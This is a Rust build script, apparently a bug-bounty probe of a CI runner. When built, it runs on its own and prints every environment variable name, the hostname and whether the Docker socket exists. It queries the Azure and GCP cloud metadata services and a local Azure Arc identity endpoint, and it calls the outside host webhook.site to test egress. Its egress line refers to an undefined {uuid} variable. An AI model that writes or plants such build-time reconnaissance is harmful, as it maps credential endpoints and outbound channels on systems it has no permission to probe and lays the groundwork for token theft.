// H1 toolsforhumanity verification build script (IBB-class CI check).
// Prints environment variable NAMES only, file-existence booleans, and
// metadata-service HTTP STATUS CODES. No secret values are read or printed.
use std::env;
use std::fs;
use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::time::Duration;

fn http_status(host: &str, port: u16, req: &str) -> String {
    let addr = (host, port).to_socket_addrs().map(|mut i| i.next());
    let addr = match addr { Ok(Some(a)) => a, _ => return "DNS-FAIL".into() };
    let mut s = match TcpStream::connect_timeout(&addr, Duration::from_secs(3)) { Ok(s) => s, Err(e) => return format!("CONN-ERR-{}", e.kind()) };
    let _ = s.set_read_timeout(Some(Duration::from_secs(4)));
    if s.write_all(req.as_bytes()).is_err() { return "WRITE-ERR".into(); }
    let mut buf = [0u8; 256];
    let n = s.read(&mut buf).unwrap_or(0);
    if n == 0 { return "EMPTY".into(); }
    String::from_utf8_lossy(&buf[..n]).lines().next().unwrap_or("?").to_string()
}

fn main() {
    println!("BBP3-BEGIN");
    let mut keys: Vec<String> = env::vars().map(|(k, _)| k).collect();
    keys.sort();
    println!("BBP3-ENV-NAMES {}", keys.join(","));
    println!("BBP3-HOSTNAME {}", fs::read_to_string("/etc/hostname").unwrap_or_default().trim());
    println!("BBP3-DOCKER-SOCK {}", fs::metadata("/var/run/docker.sock").is_ok());
    println!("BBP3-AZURE-IMDS {}", http_status("169.254.169.254", 80,
        "GET /metadata/instance?api-version=2021-02-01 HTTP/1.1
Host: 169.254.169.254
Metadata: true
Connection: close

"));
    println!("BBP3-GCP-META {}", http_status("metadata.google.internal", 80,
        "GET /computeMetadata/v1/ HTTP/1.1
Host: metadata.google.internal
Metadata-Flavor: Google
Connection: close

"));
    println!("BBP3-ARC-HIMDS {}", http_status("127.0.0.1", 40342,
        "GET /health HTTP/1.1
Host: 127.0.0.1
Connection: close

"));
    println!("BBP3-EGRESS {}", http_status("webhook.site", 80,
        format!("GET /{uuid}?src=worldcoin-runner-egress-nonce HTTP/1.1
Host: webhook.site
Connection: close

").as_str()));
    println!("BBP3-END");
}
